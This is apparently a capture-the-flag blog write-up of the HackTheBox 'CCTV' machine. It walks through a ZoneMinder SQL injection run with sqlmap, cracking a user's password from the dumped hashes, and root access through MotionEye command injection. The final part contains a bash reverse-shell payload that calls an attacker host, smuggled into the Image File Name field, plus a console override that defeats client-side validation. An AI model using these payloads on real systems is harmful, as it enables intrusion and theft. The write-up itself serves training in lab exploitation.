---
title: HackTheBox - CCTV
authors: Samarth
date: 2026-03-21 09:30:00 +0530
categories: [HackTheBox, Machines]
tags: [Linux, ZoneMinder, CVE-2024-51482, CVE-2025-60787, SQLi, MotionEye]
math: true
mermaid: true
---
![CCTV - HTB](/assets/images/writeups/CCTV-HTB/banner.png)

## TL;DR

This writeup is based on the [__CCTV__](https://app.hackthebox.com/machines/CCTV){:target="_blank"} machine, which is an easy-rated Linux box on Hack The Box. I began by scanning the target and found open ports for SSH and HTTP. After enumerating the web server, I discovered it was running **ZoneMinder v1.37.63**. Default credentials (`admin`:`admin`) gave me administrator access to the panel. I identified the instance as vulnerable to **CVE-2024-51482**, a boolean-based SQL injection in the `tid` parameter. Using `sqlmap`, I dumped the database and retrieved hashed credentials, cracking the password for the `mark` user. With these credentials, I logged in via SSH and captured the user flag. During post-exploitation, I discovered an internal **MotionEye** service running on port 8765. Using SSH port forwarding to access it, I found it running version `0.43.1b4`, which is vulnerable to **CVE-2025-60787**, an OS Command Injection vulnerability. By bypassing client-side validation and injecting a reverse shell payload into the `Image File Name` parameter, I gained a shell as root and captured the root flag.

## Scanning Network

I began by performing an Nmap scan, which revealed open ports 22 and 80, corresponding to `SSH` and `Apache httpd`. Here are the results from the Nmap scan:

```bash
nmap -sS -sC -sV -p- -T4 -v -oN full_port.scan 10.129.244.156

# Nmap 7.94SVN scan initiated Sat Mar 21 02:04:00 2026
Nmap scan report for 10.129.244.156
Host is up (0.17s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|_  256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)
80/tcp open  http    Apache httpd 2.4.58
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://cctv.htb/
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two services, SSH and HTTP, were detected. Let's proceed with enumerating the HTTP service.

## Enumeration

The Nmap scan revealed that the IP address is linked to the domain name `cctv.htb`. Therefore, we need to add this domain to the `"/etc/hosts"` file.

Then, I visited `http://cctv.htb/`.

![Browser View](/assets/images/writeups/CCTV-HTB/1.png)

### ZoneMinder

While browsing the site, I came across a **ZoneMinder** instance.

![ZoneMinder](/assets/images/writeups/CCTV-HTB/2.png)

ZoneMinder is a free, open-source closed-circuit television software application used for managing and monitoring surveillance camera systems. Let's try the default credentials.

Default credentials (`admin`:`admin`) gave me administrator access.

![ZoneMinder Dashboard](/assets/images/writeups/CCTV-HTB/3.png)

The Administrator Panel revealed that the version of ZoneMinder running is `v1.37.63`.

After researching, I found two CVEs affecting ZoneMinder `v1.37.63`: [CVE-2023-26035](https://nvd.nist.gov/vuln/detail/CVE-2023-26035){:target="_blank"} and [CVE-2024-51482](https://nvd.nist.gov/vuln/detail/CVE-2024-51482){:target="_blank"}.

ZoneMinder `v1.37.63` is vulnerable to [__CVE-2024-51482__](https://nvd.nist.gov/vuln/detail/CVE-2024-51482){:target="_blank"}.

## Exploitation

`CVE-2024-51482` is a boolean-based SQL injection vulnerability affecting ZoneMinder versions `v1.37.*` up to and including `v1.37.64`. The vulnerable parameter is `tid` in the `web/ajax/event.php` endpoint. This was fixed in version `1.37.65`.

The vulnerable endpoint can be triggered via:

```bash
http://target/zm/index.php?view=request&request=event&action=removetag&tid=[INJECTION_POINT]
```

Reference: [https://github.com/BridgerAlderson/CVE-2024-51482/blob/main/README.md](https://github.com/BridgerAlderson/CVE-2024-51482/blob/main/README.md){:target="_blank"}

Let's use `sqlmap` with an active session cookie to dump the database.

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" --dump --batch --cookie="ZMSESSID=0t7k2mk4sbm9qvdpu9nif6ltc0"
```

`sqlmap` successfully dumped the `Users` table from the `zm` database.

```
Database: zm
Table: Users
[3 entries]
+------------+--------------------------------------------------------------+
| Username   | Password                                                     |
+------------+--------------------------------------------------------------+
| superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm |
| mark       | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
| admin      | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m |
+------------+--------------------------------------------------------------+
```

I retrieved three bcrypt password hashes. Let's crack them.

![Password Cracking](/assets/images/writeups/CCTV-HTB/5.png)

I successfully cracked the password for the `mark` user.

```
Username - mark
Password - opensesame
```

Let's use these credentials to log in via SSH.

![User Shell](/assets/images/writeups/CCTV-HTB/6.png)

Success! I logged in as `mark` and obtained the user flag.

## Post Exploitation

I checked the current user's privileges using `sudo -l`, but `mark` does not belong to the sudoers group.

While further exploring the system, I discovered a **MotionEye** configuration file.

### MotionEye Configuration File

![MotionEye Configuration File](/assets/images/writeups/CCTV-HTB/7.png)

### Admin Credentials

Inside the configuration file, I found admin credentials for the MotionEye service.

![Admin Credentials](/assets/images/writeups/CCTV-HTB/8.png)

```
admin : 989c5a8ee87a0e9521ec81a79187d162109282f0
```

### Port Forwarding

The MotionEye service was running internally on port `8765`. Let's perform SSH port forwarding to access it.

```bash
ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
```

![Port Forwarding](/assets/images/writeups/CCTV-HTB/9.png)

Let's browse `http://127.0.0.1:8765` and log in using the admin credentials.

![MotionEye Dashboard](/assets/images/writeups/CCTV-HTB/10.png)

MotionEye running version `0.43.1b4` is vulnerable to [__CVE-2025-60787: MotionEye Remote Code Execution (RCE)__](https://nvd.nist.gov/vuln/detail/CVE-2025-60787){:target="_blank"}.

`CVE-2025-60787` is an OS Command Injection vulnerability in MotionEye `v0.43.1b4` and earlier. Unsanitized user input written to Motion configuration parameters such as `image_file_name` allows a remote authenticated attacker with admin access to achieve code execution when Motion is restarted.

Let's understand the steps to exploit this:

__1.__ `First` — Bypass client-side validation

MotionEye implements input validation purely on the client side via JavaScript. The validation function can be overridden directly from the browser console:

- Open browser console (`F12 → Console tab`)
- Override the function to always return `true`:

```javascript
configUiValid = function() { return true; };
```

This bypasses all frontend input restrictions, allowing arbitrary values to be saved into the Motion configuration file.

__2.__ `Second` — Start a listener on the attacker machine

```bash
nc -lvnp 4444
```

__3.__ `Third` — Inject the reverse shell payload

Navigate to **Camera Settings → Still Images** and configure:

- **Capture Mode:** `Interval Snapshots`
- **Interval:** `10`
- **Image File Name:**

```bash
$(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1\"')").%Y-%m-%d-%H-%M-%S
```

Click **Apply**. Within 10 seconds, Motion reloads the config and executes the payload.

![Root Shell](/assets/images/writeups/CCTV-HTB/11.png)

![Pwned](/assets/images/writeups/CCTV-HTB/Pwned.png)

Thanks for reading this far. If you enjoyed the writeup, do support me [__here__](https://www.buymeacoffee.com/h4xplo1t){:target="_blank"}.